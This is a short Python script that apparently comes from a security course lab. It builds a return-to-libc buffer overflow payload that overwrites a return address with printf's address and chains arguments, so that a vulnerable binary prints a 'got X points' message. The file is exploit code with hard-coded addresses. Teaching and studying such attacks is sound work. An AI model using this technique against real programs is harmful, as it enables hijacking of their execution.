#!/usr/bin/python
# -*- coding: utf-8 -*-
# attack_input2.py
import sys
import struct

offset = 0x38 # modify it
printf_addr = 0xb7e887e0 # modify it
buf_addr = 0xbffff6c4 # modify it
ret = 0xb7e56260
## Put the  construct buf below
buf = 4 * '\x69'
buf += (offset-4)*'\x90' 
buf += struct.pack('<I', printf_addr)
### please fill the buf chains below
## such as buf += struct.pack('<I', whatever_value)
## hints. arguments of printf function
buf += struct.pack('<I', ret) 
buf += struct.pack('<I', buf_addr+len(buf)+4)
buf += 'My-user-id-is-20231120,-I-got-X-points!\0'

### end 



file = open('attack_input2', 'wb')
file.write("2\n")
file.write(buf)
file.close()
